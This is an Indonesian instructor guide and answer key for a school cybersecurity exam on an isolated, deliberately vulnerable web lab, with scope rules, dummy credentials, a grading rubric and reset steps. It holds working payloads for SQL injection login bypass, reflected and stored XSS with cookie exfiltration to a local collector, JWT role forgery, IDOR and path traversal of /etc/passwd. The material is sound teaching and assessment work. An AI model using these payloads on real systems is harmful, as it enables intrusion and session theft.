# Teacher Guide — UKK Cybersecurity Web Lab

> **KHUSUS INSTRUKTUR — JANGAN DIBAGIKAN KEPADA PESERTA**
>
> Dokumen ini berisi kunci jawaban dan payload pengujian. Seluruh pengujian hanya
> boleh dilakukan pada container UKK ini, pada jaringan ujian yang terisolasi,
> dan dengan izin tertulis. Jangan gunakan payload pada sistem lain.

## 1. Tujuan Penilaian

Peserta diharapkan mampu:

1. memvalidasi scope dan kesehatan target;
2. melakukan enumeration tanpa pengujian destruktif;
3. menemukan kelemahan konfigurasi Web Internal;
4. membuktikan minimal dua kerentanan Web Vulnerable dengan dampak minimum;
5. mengumpulkan bukti request, response, dan log;
6. menjelaskan dampak serta rekomendasi perbaikan;
7. menjaga pengujian tetap di dalam scope.

## 2. Scope dan Batas Keselamatan

| Layanan | Alamat default | Fungsi |
|---|---|---|
| Web Internal | `http://192.168.50.10:8080` | Baseline audit dan hardening |
| Web Vulnerable | `http://192.168.50.10:8081` | Pengujian kerentanan web |
| Web Vulnerable dari WAN lab | `http://10.10.10.100:8081` | Jika DNAT MikroTik telah disiapkan |

Larangan:

- pengujian di luar alamat dan port tersebut;
- denial of service, brute force massal, persistence, atau penghapusan data;
- memasang container privileged atau me-mount Docker socket;
- membaca file host; path traversal hanya boleh membuktikan pembacaan file di
  dalam container;
- mengirim cookie/data ke server eksternal. Gunakan collector lokal bawaan lab;
- mempublikasikan Web Vulnerable ke internet.

## 3. Persiapan Instruktur

Jalankan dari root direktori proyek:

```bash
sudo ./scripts/labctl.sh status
sudo ./scripts/labctl.sh health
```

Kondisi siap:

```text
Web Internal            OK
Web Vulnerable          OK
Container internal      OK
Container vulnerable    OK
```

Jika container masih berstatus `starting`, tunggu 10–20 detik dan ulangi. Cek
pemetaan port:

```bash
sudo docker ps
```

Expected:

```text
192.168.50.10:8080->8080/tcp
192.168.50.10:8081->5000/tcp
```

Siapkan terminal pemantauan log:

```bash
sudo tail -f logs/web-internal/access.log
sudo tail -f logs/web-vuln/access.jsonl
sudo tail -f logs/web-vuln/collector.log
```

Catatan: ganti `192.168.50.10` pada seluruh contoh jika `SERVER_IP` dalam `.env`
berbeda.

## 4. Akun Dummy

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | admin |
| `siswa` | `siswa123` | user |
| `auditor` | `audit2026` | auditor |

Kredensial hanya untuk lab. Password disimpan dalam plaintext dan sengaja lemah.

## 5. Baseline Web Internal

### 5.1 Informasi server dan security headers

```bash
curl -i http://192.168.50.10:8080/
```

Expected finding:

- header `Server` mengungkap Nginx karena `server_tokens on`;
- tidak ada header hardening seperti `Content-Security-Policy`,
  `X-Content-Type-Options`, `Referrer-Policy`, dan `Permissions-Policy`;
- HTTP belum menggunakan TLS jika desain jaringan mengharuskan HTTPS.

Rekomendasi: nonaktifkan `server_tokens`, tambahkan security headers yang sesuai,
dan gunakan TLS pada deployment nyata.

### 5.2 Directory listing dan file sensitif

```bash
curl -i http://192.168.50.10:8080/download/
curl -i http://192.168.50.10:8080/download/backup-config.txt
curl -i http://192.168.50.10:8080/download/inventory.csv
```

Expected: index direktori ditampilkan dan file dummy dapat diunduh tanpa
autentikasi.

Rekomendasi: `autoindex off`, pindahkan backup dari document root, dan terapkan
autentikasi serta otorisasi.

### 5.3 Informasi sensitif pada robots.txt

```bash
curl -i http://192.168.50.10:8080/robots.txt
```

Expected: path yang menarik untuk enumeration terungkap. `robots.txt` bukan
mekanisme kontrol akses.

### 5.4 Halaman admin tanpa autentikasi

```bash
curl -i http://192.168.50.10:8080/admin/
```

Expected: halaman admin dummy dapat dibuka tanpa login.

Rekomendasi: autentikasi server-side, pemeriksaan role, deny-by-default, dan
segmentasi akses administratif.

## 6. Enumeration Web Vulnerable

Mulai dengan request berdampak rendah:

```bash
curl -i http://192.168.50.10:8081/
curl -i http://192.168.50.10:8081/robots.txt
curl -i http://192.168.50.10:8081/static/backup/app.env.bak
```

Expected:

- `robots.txt` mengungkap `/static/backup/`, `/admin/collector`, dan `/api/admin`;
- backup environment dapat dibaca tanpa autentikasi;
- backup mengandung secret dummy JWT;
- security headers tidak lengkap.

Peserta boleh menggunakan browser, Burp Suite, atau OWASP ZAP sebagai proxy,
tetapi tidak perlu menjalankan active scan agresif untuk lulus.

## 7. Kunci Pengujian Kerentanan

### 7.1 SQL Injection pada login

Endpoint: `POST /login`

Baseline gagal:

```bash
curl -i -X POST http://192.168.50.10:8081/login \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=salah'
```

Pembuktian minimal:

```bash
curl -i -X POST http://192.168.50.10:8081/login \
  --data-urlencode "username=admin' -- " \
  --data-urlencode 'password=apa-saja'
```

Expected:

- response `302` menuju `/dashboard?user=admin&role=admin`;
- terdapat header `Set-Cookie: lab_session=...`;
- login berhasil tanpa mengetahui password admin.

Severity rekomendasi: **Critical/High**, bergantung metodologi penilaian.

Perbaikan: gunakan parameterized query untuk username dan password, hash password
dengan algoritme modern, serta gunakan autentikasi dan session management yang
aman.

### 7.2 Reflected XSS

Endpoint: `GET /search?q=`

Buka hanya pada browser lab:

```text
http://192.168.50.10:8081/search?q=%3Cscript%3Ealert(%27UKK%27)%3C%2Fscript%3E
```

Expected: dialog JavaScript `UKK` muncul dan payload terlihat tidak di-escape pada
response HTML.

Alternatif bukti response tanpa eksekusi:

```bash
curl -sG http://192.168.50.10:8081/search \
  --data-urlencode "q=<script>alert('UKK')</script>"
```

Severity rekomendasi: **Medium**.

Perbaikan: pertahankan auto-escaping template, jangan mengubah input menjadi
`Markup`, lakukan contextual output encoding, dan tambahkan CSP sebagai defense
in depth.

### 7.3 Stored XSS dan simulasi cookie exfiltration

Pertama login menggunakan salah satu akun dummy agar browser menerima cookie
`lab_session`. Masukkan komentar melalui `/comments`:

```html
<script>alert(document.cookie)</script>
```

Expected: payload tersimpan dan berjalan setiap halaman komentar dibuka. Cookie
`lab_session` dapat dibaca JavaScript karena sengaja tidak memakai `HttpOnly`.

Untuk simulasi exfiltration, gunakan collector **same-origin** bawaan lab:

```html
<script>fetch('/collector?c='+encodeURIComponent(document.cookie))</script>
```

Verifikasi hanya pada lab:

```text
http://192.168.50.10:8081/admin/collector
```

atau:

```bash
sudo tail -n 20 logs/web-vuln/collector.log
```

Expected: collector mencatat cookie dummy dan source IP. Jangan mengirim data ke
domain atau IP lain.

Severity rekomendasi: **High**.

Perbaikan: output encoding, sanitasi HTML dengan allowlist jika HTML memang
diperlukan, cookie `HttpOnly; Secure; SameSite`, CSP, dan proteksi halaman collector.

### 7.4 Weak credentials

Uji salah satu akun pada `/login` atau API:

```bash
curl -i -X POST http://192.168.50.10:8081/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}'
```

Expected: HTTP `200` dan sebuah JWT.

Severity rekomendasi: **High** jika akun admin dapat diakses dari jaringan yang
tidak dipercaya.

Perbaikan: password unik dan kuat, hashing password, rate limiting, MFA untuk
administrator, serta penghapusan kredensial default.

### 7.5 JWT secret exposure dan role forgery

Temukan secret dummy:

```bash
curl -s http://192.168.50.10:8081/static/backup/app.env.bak
```

Ambil token user biasa:

```bash
curl -s -X POST http://192.168.50.10:8081/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"siswa","password":"siswa123"}'
```

Token asli dengan role `user` harus ditolak oleh `/api/admin` dengan status `403`.
Untuk memvalidasi dampak secret yang bocor, instruktur dapat membuat token role
admin **di dalam container lab**:

```bash
TOKEN=$(sudo docker exec ukk-web-vuln python -c "import time,jwt; print(jwt.encode({'sub':'2','username':'siswa','role':'admin','exp':int(time.time())+3600},'ukk-jwt-secret-2026',algorithm='HS256'))")

curl -i http://192.168.50.10:8081/api/admin \
  -H "Authorization: Bearer $TOKEN"
```

Expected: HTTP `200`, `admin access granted`, dan flag lab
`UKK{JWT_ROLE_VALIDATED}`.

Severity rekomendasi: **Critical/High**.

Perbaikan: jangan menyimpan backup/secret di document root, rotasi secret, gunakan
secret manager, batasi algoritme, validasi issuer/audience, dan jangan hanya
memercayai role dari token tanpa kontrol otorisasi yang sesuai.

### 7.6 IDOR / Broken Object Level Authorization

```bash
curl -i http://192.168.50.10:8081/api/profile/1
curl -i http://192.168.50.10:8081/api/profile/2
curl -i http://192.168.50.10:8081/api/profile/3
```

Expected: seluruh profil dapat dibaca tanpa autentikasi hanya dengan mengganti ID,
termasuk username, role, nama, dan email dummy.

Severity rekomendasi: **High/Medium**, sesuai sensitivitas data dan dampak bisnis.

Perbaikan: wajibkan autentikasi dan lakukan pemeriksaan otorisasi object-level pada
setiap request; jangan mengandalkan ID yang sulit ditebak.

### 7.7 Path traversal

Baseline file yang diizinkan:

```bash
curl -i 'http://192.168.50.10:8081/download?file=readme.txt'
```

Pembuktian minimal dalam container:

```bash
curl -i --path-as-is \
  'http://192.168.50.10:8081/download?file=../../../../etc/passwd'
```

Expected: isi `/etc/passwd` milik container terlihat. Berhenti setelah bukti ini;
jangan mencoba membaca secret host atau melakukan enumeration filesystem massal.

Severity rekomendasi: **High**.

Perbaikan: gunakan allowlist nama file atau `safe_join`, resolve canonical path dan
pastikan hasilnya tetap berada di direktori file, serta hindari menampilkan detail
error filesystem.

### 7.8 Missing security headers dan verbose error

```bash
curl -i http://192.168.50.10:8081/
curl -i 'http://192.168.50.10:8081/download?file=tidak-ada.txt'
curl -i -X POST http://192.168.50.10:8081/login \
  --data-urlencode "username='" \
  --data-urlencode 'password=x'
```

Expected: security headers tidak lengkap dan beberapa response menampilkan detail
internal yang membantu attacker.

Perbaikan: generic error untuk client, detail hanya di log server, dan security
headers yang disesuaikan dengan aplikasi.

## 8. Bukti Minimum yang Harus Dikumpulkan Peserta

Untuk setiap finding, laporan minimal berisi:

- judul dan kategori kerentanan;
- target URL, method, parameter, waktu, dan source IP;
- request dan bagian response yang relevan;
- screenshot atau output terminal;
- baris log yang berkorelasi;
- langkah reproduksi yang ringkas;
- dampak pada confidentiality, integrity, dan availability;
- severity beserta alasan;
- rekomendasi teknis;
- pernyataan bahwa pengujian dilakukan dalam scope.

Contoh korelasi log:

```bash
sudo tail -n 50 logs/web-vuln/access.jsonl
sudo grep 'api/profile' logs/web-vuln/access.jsonl
sudo grep 'download' logs/web-vuln/access.jsonl
```

Field yang tersedia meliputi `timestamp`, `src_ip`, `method`, `path`, `query`,
`status`, `user_agent`, `host`, dan `duration_ms`.

## 9. Rubrik Penilaian (100 Poin)

| Komponen | Poin | Kriteria |
|---|---:|---|
| Scope dan keselamatan | 10 | Target benar, tidak destruktif, tidak keluar scope |
| Baseline Web Internal | 15 | Minimal dua finding valid dengan bukti |
| Enumeration Web Vulnerable | 10 | Endpoint dan attack surface dipetakan sistematis |
| Pembuktian kerentanan | 30 | Minimal dua exploit berhasil, repeatable, berdampak minimum |
| Bukti dan korelasi log | 15 | Request/response, source IP, waktu, dan log sesuai |
| Analisis risiko | 10 | Dampak dan severity masuk akal |
| Rekomendasi | 10 | Spesifik, teknis, dan relevan dengan akar masalah |

Saran predikat:

- 90–100: sangat kompeten;
- 80–89: kompeten;
- 70–79: cukup kompeten dengan perbaikan minor;
- di bawah 70: perlu remediasi;
- pelanggaran scope atau tindakan destruktif: hentikan ujian dan ikuti kebijakan
  lembaga, terlepas dari skor teknis.

## 10. Checklist Kunci Jawaban

Web Internal:

- [ ] versi/server disclosure;
- [ ] missing security headers;
- [ ] directory listing `/download/`;
- [ ] file backup/inventory dapat dibaca;
- [ ] path sensitif pada `robots.txt`;
- [ ] `/admin/` tanpa autentikasi.

Web Vulnerable:

- [ ] SQL injection pada `POST /login`;
- [ ] reflected XSS pada `/search?q=`;
- [ ] stored XSS pada `/comments`;
- [ ] cookie dummy dapat dibaca JavaScript dan dicatat collector lokal;
- [ ] weak/default credentials;
- [ ] JWT secret pada backup dan role forgery;
- [ ] IDOR pada `/api/profile/<id>`;
- [ ] path traversal pada `/download?file=`;
- [ ] missing headers dan verbose error.

## 11. Reset Setelah Ujian

Reset menghapus database latihan, komentar, collector, dan seluruh log. Pastikan
bukti penilaian sudah disalin sebelum menjalankannya:

```bash
sudo ./scripts/labctl.sh reset
```

Jawab `y`, tunggu container sehat, lalu validasi:

```bash
sudo ./scripts/labctl.sh health
```

## 12. Troubleshooting

### Container `starting`

Tunggu 10–20 detik lalu ulangi health check:

```bash
sudo ./scripts/labctl.sh health
```

### Container sehat tetapi endpoint gagal

```bash
sudo docker ps
sudo ss -lntp | grep -E ':8080|:8081'
sudo docker logs --tail=100 ukk-web-internal
sudo docker logs --tail=100 ukk-web-vuln
```

Pastikan `.env` berisi IP yang benar-benar terpasang pada Ubuntu:

```bash
ip -br -4 address
grep -E '^(SERVER_IP|WEB_INTERNAL_PORT|WEB_VULN_PORT)=' .env
```

### Web Internal gagal menulis log

```bash
sudo chown -R 101:101 logs/web-internal
sudo chown -R 10001:10001 logs/web-vuln
sudo chmod 750 logs logs/web-internal logs/web-vuln
sudo ./scripts/labctl.sh restart
```

### Melihat kondisi tanpa mengubah data

```bash
sudo ./scripts/labctl.sh status
sudo docker compose --env-file .env -f compose.yml logs --tail=100
```
